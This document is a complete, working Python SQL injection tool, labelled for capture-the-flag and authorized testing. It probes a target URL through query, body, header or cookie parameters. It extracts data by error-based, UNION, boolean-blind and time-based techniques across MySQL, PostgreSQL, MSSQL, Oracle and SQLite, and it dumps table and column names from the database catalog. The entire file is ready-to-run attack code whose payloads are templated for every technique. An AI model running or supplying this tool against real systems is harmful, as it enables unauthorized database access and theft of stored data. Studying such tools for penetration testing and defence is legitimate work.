#!/usr/bin/env python3
# SQLi ENUM Templates (All Major DBs): mysql|mariadb|pg|mssql|oracle|sqlite
# Modes: error, union, boolean, time, dump-tables, dump-columns
# Examples:
#   UNION triage & extract current DB:
#     python sqli_enum_all_db.py --mode union --dbms pg --url 'https://host/item' --param id --inject-point qs --printable 2 --expr 'current_database()'
#   Dump first 20 tables via UNION:
#     python sqli_enum_all_db.py --mode dump-tables --dbms mysql --url 'https://host/search' --param q --inject-point qs --printable 1 --limit 20
#   Dump columns of a table via BOOLEAN (fallback when no reflection):
#     python sqli_enum_all_db.py --mode dump-columns --dbms mssql --tech boolean --url 'https://host/item' --param id --inject-point qs --table Users --limit 30

from __future__ import annotations
import argparse, time, re
from typing import Any, Dict, Optional, List, Tuple
import requests
from requests.adapters import HTTPAdapter, Retry

# -------------------------- HTTP client -------------------------------- #

def http_session() -> requests.Session:
    s = requests.Session()
    r = Retry(total=3, backoff_factor=0.3, status_forcelist=(429, 500, 502, 503, 504))
    s.mount("http://", HTTPAdapter(max_retries=r))
    s.mount("https://", HTTPAdapter(max_retries=r))
    s.headers.update({"User-Agent": "CTF-SQLi-Enum/3.0", "Accept": "*/*"})
    return s

def send_request(
    session: requests.Session,
    url: str,
    method: str = "GET",
    inject_point: str = "qs",  # qs|body|header|cookie
    param: Optional[str] = None,
    value: Optional[str] = None,
    base_params: Optional[Dict[str, Any]] = None,
    base_json: Optional[Dict[str, Any]] = None,
    base_headers: Optional[Dict[str, str]] = None,
    base_cookies: Optional[Dict[str, str]] = None,
    stream: bool = False,
) -> requests.Response:
    base_params = base_params or {}
    base_json = base_json or {}
    base_headers = base_headers or {}
    base_cookies = base_cookies or {}

    if param is not None:
        if inject_point == "qs":
            q = dict(base_params); q[param] = value
            return session.request(method, url, params=q, headers=base_headers, cookies=base_cookies, stream=stream)
        elif inject_point == "body":
            j = dict(base_json); j[param] = value
            return session.request(method, url, json=j, headers={"Content-Type":"application/json", **base_headers}, cookies=base_cookies, stream=stream)
        elif inject_point == "header":
            h = dict(base_headers); h[param] = value
            return session.request(method, url, params=base_params, json=base_json, headers=h, cookies=base_cookies, stream=stream)
        elif inject_point == "cookie":
            c = dict(base_cookies); c[param] = value
            return session.request(method, url, params=base_params, json=base_json, headers=base_headers, cookies=c, stream=stream)
        else:
            raise ValueError("inject_point must be qs|body|header|cookie")
    else:
        return session.request(method, url, params=base_params, json=base_json, headers=base_headers, cookies=base_cookies, stream=stream)

def is_diff(a: requests.Response, b: requests.Response) -> bool:
    return (a.status_code != b.status_code) or (len(a.content) != len(b.content)) or (a.text[:120] != b.text[:120])

# ------------------------ DBMS profiles -------------------------------- #

class DBMS:
    name: str
    comment_tail: str
    # string ops
    concat_fmt: str          # {a},{b}
    wrap_visible_fmt: str    # markers ~{expr}~
    len_fn: str              # {expr}
    sub_fn: str              # {expr},{pos},{length}
    asc_fn: str              # {char_expr}
    union_null: str
    printable_wrap_expr: str # force string
    # sleep
    def sleep_expr(self, seconds: int, cond: Optional[str] = None) -> str: ...
    # catalog queries: return SQL expr that yields one value by offset (0-based)
    def table_name_expr(self, idx: int) -> str: ...
    def column_name_expr(self, table: str, idx: int) -> str: ...

# ---- MySQL / MariaDB ----
class MySQL(DBMS):
    name = "mysql"
    comment_tail = "-- "
    concat_fmt = "CONCAT({a},{b})"
    wrap_visible_fmt = "CONCAT('~',({expr}),'~')"
    len_fn = "LENGTH({expr})"
    sub_fn = "SUBSTRING({expr},{pos},{length})"
    asc_fn = "ASCII({expr})"
    union_null = "NULL"
    printable_wrap_expr = "({expr})"
    def sleep_expr(self, seconds: int, cond: Optional[str] = None) -> str:
        return f"IF({cond or '1=1'}, SLEEP({seconds}), 0)"
    def table_name_expr(self, idx: int) -> str:
        return f"(SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET {idx})"
    def column_name_expr(self, table: str, idx: int) -> str:
        return f"(SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}' ORDER BY ordinal_position LIMIT 1 OFFSET {idx})"

# ---- PostgreSQL ----
class Postgres(DBMS):
    name = "pg"
    comment_tail = "-- "
    concat_fmt = "({a})||({b})"
    wrap_visible_fmt = "('~'||({expr})||'~')"
    len_fn = "LENGTH({expr})"
    sub_fn = "SUBSTRING({expr} FROM {pos} FOR {length})"
    asc_fn = "ASCII({expr})"
    union_null = "NULL"
    printable_wrap_expr = "({expr})::text"
    def sleep_expr(self, seconds: int, cond: Optional[str] = None) -> str:
        return f"CASE WHEN {cond or '1=1'} THEN pg_sleep({seconds}) ELSE 0 END"
    def table_name_expr(self, idx: int) -> str:
        # current_schema() tables only; adjust to search_path if needed
        return f"(SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() ORDER BY table_name LIMIT 1 OFFSET {idx})"
    def column_name_expr(self, table: str, idx: int) -> str:
        return f"(SELECT column_name FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='{table}' ORDER BY ordinal_position LIMIT 1 OFFSET {idx})"

# ---- MS SQL Server ----
class MSSQL(DBMS):
    name = "mssql"
    comment_tail = "--"
    concat_fmt = "({a})+({b})"
    wrap_visible_fmt = "('~'+({expr})+'~')"
    len_fn = "LEN({expr})"
    sub_fn = "SUBSTRING({expr},{pos},{length})"
    asc_fn = "ASCII({expr})"
    union_null = "NULL"
    printable_wrap_expr = "CAST(({expr}) AS NVARCHAR(4000))"
    def sleep_expr(self, seconds: int, cond: Optional[str] = None) -> str:
        return f"IF {cond or '(1=1)'} WAITFOR DELAY '0:0:{int(seconds)}'"
    def table_name_expr(self, idx: int) -> str:
        # Top/Offset (works on modern SQL Server)
        return f"(SELECT name FROM sys.tables ORDER BY name OFFSET {idx} ROWS FETCH NEXT 1 ROWS ONLY)"
    def column_name_expr(self, table: str, idx: int) -> str:
        return f"""(
          SELECT c.name
          FROM sys.columns c
          JOIN sys.tables t ON t.object_id=c.object_id
          WHERE t.name='{table}'
          ORDER BY c.column_id
          OFFSET {idx} ROWS FETCH NEXT 1 ROWS ONLY
        )"""

# ---- Oracle ----
class Oracle(DBMS):
    name = "oracle"
    comment_tail = "--"
    concat_fmt = "({a})||({b})"
    wrap_visible_fmt = "('~'||({expr})||'~')"
    len_fn = "LENGTH({expr})"
    sub_fn = "SUBSTR({expr},{pos},{length})"
    asc_fn = "ASCII({expr})"
    union_null = "TO_CHAR(NULL)"
    printable_wrap_expr = "TO_CHAR(({expr}))"
    def sleep_expr(self, seconds: int, cond: Optional[str] = None) -> str:
        return f"CASE WHEN {cond or '1=1'} THEN DBMS_PIPE.RECEIVE_MESSAGE('x',{int(seconds)}) ELSE 0 END"
    def table_name_expr(self, idx: int) -> str:
        # USER_TABLES for current schema; ALL_TABLES for broader
        return f"(SELECT table_name FROM (SELECT table_name, ROW_NUMBER() OVER (ORDER BY table_name) rn FROM user_tables) WHERE rn={idx+1})"
    def column_name_expr(self, table: str, idx: int) -> str:
        return f"(SELECT column_name FROM (SELECT column_name, ROW_NUMBER() OVER (ORDER BY column_id) rn FROM user_tab_columns WHERE table_name=UPPER('{table}')) WHERE rn={idx+1})"

# ---- SQLite ----
class SQLite(DBMS):
    name = "sqlite"
    comment_tail = "-- "
    concat_fmt = "({a})||({b})"
    wrap_visible_fmt = "('~'||({expr})||'~')"
    len_fn = "LENGTH({expr})"
    sub_fn = "SUBSTR({expr},{pos},{length})"
    asc_fn = "UNICODE({expr})"
    union_null = "NULL"
    printable_wrap_expr = "CAST(({expr}) AS TEXT)"
    def sleep_expr(self, seconds: int, cond: Optional[str] = None) -> str:
        # no native sleep; time-tech is unreliable—prefer boolean for sqlite
        return f"CASE WHEN {cond or '1=1'} THEN (SELECT COUNT(*) FROM (SELECT randomblob(10000000))) ELSE 0 END"
    def table_name_expr(self, idx: int) -> str:
        return f"(SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT 1 OFFSET {idx})"
    def column_name_expr(self, table: str, idx: int) -> str:
        # PRAGMA returns a table; pick name with LIMIT/OFFSET via subquery
        return f"(SELECT name FROM pragma_table_info('{table}') ORDER BY cid LIMIT 1 OFFSET {idx})"

DBS: Dict[str, DBMS] = {
    "mysql": MySQL(), "mariadb": MySQL(),
    "pg": Postgres(), "postgres": Postgres(),
    "mssql": MSSQL(),
    "oracle": Oracle(),
    "sqlite": SQLite(),
}

# ----------------------- Core extractors -------------------------------- #

def error_based_probe(url: str, param: str, inject_point: str) -> None:
    s = http_session()
    base = send_request(s, url, inject_point=inject_point, param=param, value="1")
    inj  = send_request(s, url, inject_point=inject_point, param=param, value="1'")
    print("[*] Baseline:", base.status_code, len(base.content))
    print("[*] Breaker  :", inj.status_code, len(inj.content))
    err = inj.text.lower()
    sigs = ["sql", "syntax", "mysql", "postgres", "sqlserver", "sqlite", "oracle", "ora-"]
    if any(sig in err for sig in sigs) or inj.status_code >= 500 or is_diff(base, inj):
        print("[+] Possible error-based SQLi signal")
    else:
        print("[-] No obvious error signal (prod errors hidden?)")

# ---- UNION helpers ----

def union_placeholders(db: DBMS, cols: int, printable_idx: int, expr: str) -> str:
    fields = [db.union_null] * cols
    fields[printable_idx-1] = db.printable_wrap_expr.format(expr=expr)
    return ",".join(fields)

def union_extract_text(db: DBMS, url: str, param: str, inject_point: str, cols: int, printable_idx: int, expr: str) -> Optional[str]:
    s = http_session()
    wrapped = db.wrap_visible_fmt.format(expr=expr)
    payload = f"0 UNION SELECT {union_placeholders(db, cols, printable_idx, wrapped)}{db.comment_tail}"
    r = send_request(s, url, inject_point=inject_point, param=param, value=payload)
    m = re.search(r"~(.*?)~", r.text, re.S)
    return m.group(1) if m else None

def union_find_cols(db: DBMS, url: str, param: str, inject_point: str, max_cols: int) -> int:
    s = http_session()
    for n in range(1, max_cols+1):
        payload = f"0 ORDER BY {n}{db.comment_tail}"
        r = send_request(s, url, inject_point=inject_point, param=param, value=payload)
        if r.status_code >= 500:
            return n-1
    return max_cols

# ---- BOOLEAN/TIME bitwise char extraction ----

def boolean_char_at(db: DBMS, url: str, param: str, inject_point: str, expr: str, pos: int) -> str:
    s = http_session()
    char_expr = db.sub_fn.format(expr=f"({expr})", pos=pos, length=1)
    ascii_expr = db.asc_fn.format(expr=char_expr)
    def q(cond: str) -> bool:
        r_t = send_request(s, url, inject_point=inject_point, param=param, value=f"1 AND ({cond}){db.comment_tail}")
        r_f = send_request(s, url, inject_point=inject_point, param=param, value=f"1 AND NOT ({cond}){db.comment_tail}")
        return len(r_t.content) != len(r_f.content)
    lo, hi = 32, 126
    while lo <= hi:
        mid = (lo + hi)//2
        if q(f"{ascii_expr}>{mid}"): lo = mid + 1
        else: hi = mid - 1
    return chr(lo)

def boolean_extract(db: DBMS, url: str, param: str, inject_point: str, expr: str, max_len: int = 128) -> str:
    s = http_session()
    length_expr = db.len_fn.format(expr=f"({expr})")
    def qlen(L: int) -> bool:
        r_t = send_request(s, url, inject_point=inject_point, param=param, value=f"1 AND ({length_expr}={L}){db.comment_tail}")
        r_f = send_request(s, url, inject_point=inject_point, param=param, value=f"1 AND ({length_expr}!={L}){db.comment_tail}")
        return len(r_t.content) != len(r_f.content)
    L = 0
    for i in range(1, max_len+1):
        if qlen(i): L = i; break
    if L == 0: L = max_len
    out = []
    for i in range(1, L+1):
        out.append(boolean_char_at(db, url, param, inject_point, expr, i))
        print(f"[=] {i}/{L}: {out[-1]}")
    return "".join(out)

def time_extract(db: DBMS, url: str, param: str, inject_point: str, expr: str, delay: int = 3, max_len: int = 128) -> str:
    s = http_session()
    def took_long(payload: str) -> bool:
        t0 = time.time()
        send_request(s, url, inject_point=inject_point, param=param, value=f"1 AND ({payload}){db.comment_tail}")
        return (time.time() - t0) > (delay - 0.2)
    # length
    length_expr = db.len_fn.format(expr=f"({expr})")
    L = 0
    for i in range(1, max_len+1):
        if took_long(db.sleep_expr(delay, cond=f"{length_expr}={i}")):
            L = i; break
    if L == 0: L = max_len
    out = []
    for pos in range(1, L+1):
        char_expr = db.sub_fn.format(expr=f"({expr})", pos=pos, length=1)
        ascii_expr = db.asc_fn.format(expr=char_expr)
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi)//2
            if took_long(db.sleep_expr(delay, cond=f"{ascii_expr}>{mid}")):
                lo = mid + 1
            else:
                hi = mid - 1
        out.append(chr(lo))
        print(f"[=] {pos}/{L}: {out[-1]}")
    return "".join(out)

# ----------------------- Catalog dumpers -------------------------------- #

def enum_tables(db: DBMS, url: str, param: str, inject_point: str,
                tech: str, limit: int, offset: int, cols: int = 8, printable: int = 1, delay: int = 3) -> List[str]:
    tables = []
    for i in range(offset, offset + limit):
        expr = db.table_name_expr(i)
        if tech == "union":
            val = union_extract_text(db, url, param, inject_point, cols, printable, expr)
        elif tech == "boolean":
            val = boolean_extract(db, url, param, inject_point, expr, max_len=128)
        else:
            val = time_extract(db, url, param, inject_point, expr, delay=delay, max_len=128)
        if val:
            print(f"[+] table[{i}]: {val}")
            tables.append(val)
        else:
            print(f"[-] table[{i}]: <none>")
    return tables

def enum_columns(db: DBMS, url: str, param: str, inject_point: str, table: str,
                 tech: str, limit: int, offset: int, cols: int = 8, printable: int = 1, delay: int = 3) -> List[str]:
    columns = []
    for i in range(offset, offset + limit):
        expr = db.column_name_expr(table, i)
        if tech == "union":
            val = union_extract_text(db, url, param, inject_point, cols, printable, expr)
        elif tech == "boolean":
            val = boolean_extract(db, url, param, inject_point, expr, max_len=128)
        else:
            val = time_extract(db, url, param, inject_point, expr, delay=delay, max_len=128)
        if val:
            print(f"[+] column[{i}]: {val}")
            columns.append(val)
        else:
            print(f"[-] column[{i}]: <none>")
    return columns

# -------------------------------- CLI ---------------------------------- #

def main():
    ap = argparse.ArgumentParser(description="SQLi enum templates (multi-DB). For authorized testing only.")
    ap.add_argument("--mode", required=True, choices=["error","union","boolean","time","dump-tables","dump-columns"])
    ap.add_argument("--dbms", default="mysql", choices=list(DBS.keys()))
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", help="Parameter to inject (qs/body/header/cookie)")
    ap.add_argument("--inject-point", default="qs", choices=["qs","body","header","cookie"])
    ap.add_argument("--cols", type=int, default=8, help="UNION: max columns to try / placeholder count")
    ap.add_argument("--printable", type=int, default=1, help="UNION: printable column index (1-based)")
    ap.add_argument("--expr", help="Ad-hoc expression to extract")
    ap.add_argument("--tech", default="union", choices=["union","boolean","time"], help="Technique for dump modes")
    ap.add_argument("--limit", type=int, default=20, help="Dump limit")
    ap.add_argument("--offset", type=int, default=0, help="Dump offset (0-based)")
    ap.add_argument("--table", help="Table name for dump-columns")
    ap.add_argument("--delay", type=int, default=3, help="Time-based delay seconds")
    args = ap.parse_args()

    db = DBS[args.dbms]

    if args.mode == "error":
        assert args.param, "--param required"
        error_based_probe(args.url, args.param, args.inject_point)

    elif args.mode == "union":
        assert args.param, "--param required"
        if not args.expr:
            defaults = {
                "mysql":"database()", "mariadb":"database()", "pg":"current_database()",
                "postgres":"current_database()", "mssql":"DB_NAME()", "oracle":"SYS_CONTEXT('USERENV','CURRENT_SCHEMA')",
                "sqlite":"sqlite_version()",
            }
            args.expr = defaults.get(db.name, "version()")
        # Try extraction directly (assumes you know printable column)
        out = union_extract_text(db, args.url, args.param, args.inject_point, args.cols, args.printable, args.expr)
        print("[+] Extracted:", out)

    elif args.mode in ("boolean","time"):
        assert args.param and args.expr, "--param and --expr required"
        if args.mode == "boolean":
            out = boolean_extract(db, args.url, args.param, args.inject_point, args.expr)
        else:
            out = time_extract(db, args.url, args.param, args.inject_point, args.expr, delay=args.delay)
        print("[+] Extracted:", out)

    elif args.mode == "dump-tables":
        assert args.param, "--param required"
        vals = enum_tables(db, args.url, args.param, args.inject_point, tech=args.tech, limit=args.limit, offset=args.offset, cols=args.cols, printable=args.printable, delay=args.delay)
        print("\n== Tables ==")
        for v in vals: print(v)

    elif args.mode == "dump-columns":
        assert args.param and args.table, "--param and --table required"
        vals = enum_columns(db, args.url, args.param, args.inject_point, table=args.table, tech=args.tech, limit=args.limit, offset=args.offset, cols=args.cols, printable=args.printable, delay=args.delay)
        print(f"\n== Columns of {args.table} ==")
        for v in vals: print(v)

if __name__ == "__main__":
    main()
